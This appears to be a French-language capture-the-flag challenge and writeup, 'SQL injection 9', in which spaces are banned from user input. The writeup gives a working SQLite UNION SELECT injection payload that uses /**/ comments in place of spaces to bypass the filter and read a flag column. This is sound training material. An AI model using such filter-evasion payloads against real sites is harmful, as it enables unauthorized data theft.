# SQL injection 9

> web

Author: [Alexandre-Xavier Labonté-Lamoureux (AXDOOMER)](https://github.com/axdoomer)

Bon, j'ai menti, ce n'était pas le dernier défi d'injection SQL. Le propriétaire du site web est vraiment tanné de se faire voler tous ses flags. Il reste un flag dans la colonne `flag` de la table `flag`, mais le propriétaire du site a interdit les espaces dans les champs d'input de l'utilisateur. En d'autres mots, votre injection SQL ne sera pas exécutée si elle contient des espaces. 

Maintenant que les espaces sont interdites, pouvez-vous trouver un moyen de quand même effectuer un injection SQL?

## Setup

Requirements:
- BurpSuite

# Writeup

Il faut trouver un moyen d'avoir des espaces sans en utiliser. Avec SQLite, on peut insérer des espaces en utilisant `/**/` dans une requête. 

`"/**/union/**/select/**/1,2,flag/**/from/**/flag--`

